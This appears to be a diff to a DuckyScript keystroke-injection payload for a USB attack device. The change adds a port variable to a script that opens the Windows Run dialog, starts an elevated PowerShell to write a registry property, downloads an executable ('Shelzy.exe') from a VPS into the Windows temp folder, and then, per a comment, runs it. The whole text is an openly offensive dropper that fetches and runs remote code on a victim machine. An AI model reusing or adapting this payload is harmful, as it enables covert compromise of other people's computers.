@@ -7,6 +7,7 @@ REM Note: replace VPSIPHERE with the IP of your VPS and the correct port (ex:444
 REM Version: 1.0
 DEFINE #VPSISHERE 0.0.0.0
 DEFINE #EXE_NAME Shelzy.exe
+DEFINE #PORT 4444
 EXTENSION PASSIVE_WINDOWS_DETECT
 DELAY 100
 GUI r
@@ -28,7 +29,7 @@ STRINGLN Start-Process powershell -Verb RunAs -ArgumentList 'New-ItemProperty -P
 DELAY 500
 
 REM Download payload from VPS Invoke-WebRequest
-STRINGLN Invoke-WebRequest -Uri "http://#VPSIPHERE:4444/#EXE_NAME" -OutFile "$env:windir\temp\Cache\#EXE_NAME"
+STRINGLN Invoke-WebRequest -Uri "http://#VPSIPHERE:#PORT/#EXE_NAME" -OutFile "$env:windir\temp\Cache\#EXE_NAME"
 DELAY 3000
 
 REM Execute the downloaded payload
